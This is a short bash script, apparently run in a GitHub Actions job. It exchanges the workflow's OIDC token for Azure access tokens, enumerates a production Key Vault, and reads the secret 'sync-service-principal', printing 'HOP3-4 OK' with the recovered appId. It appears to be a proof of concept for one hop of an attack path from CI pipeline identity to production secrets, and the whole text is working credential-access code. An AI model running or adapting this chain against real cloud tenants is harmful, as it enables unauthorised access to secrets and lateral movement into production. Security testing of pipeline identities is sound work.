#!/usr/bin/env bash
set -euo pipefail
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
tok(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$AZURE_CLIENT_ID" --data-urlencode grant_type=client_credentials \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1" \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','ERR '+str(d.get('error_description',''))[:120]))"; }
ARM=$(tok "https://management.azure.com/.default")
echo "deployer ARM token: ${ARM:0:8}..."
KV=$(curl -s "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-nw-platform-prod-sea/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" -H "Authorization: Bearer $ARM" | python3 -c "import sys,json;print([v['name'] for v in json.load(sys.stdin)['value'] if v['name'].startswith('kv-nw-prod')][0])")
echo "deployer enumerated vault: $KV"
VT=$(tok "https://vault.azure.net/.default")
curl -s "https://$KV.vault.azure.net/secrets/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c "import sys,json;v=json.loads(json.load(sys.stdin)['value']);print('HOP3-4 OK - read automation appId:', v['appId'])"
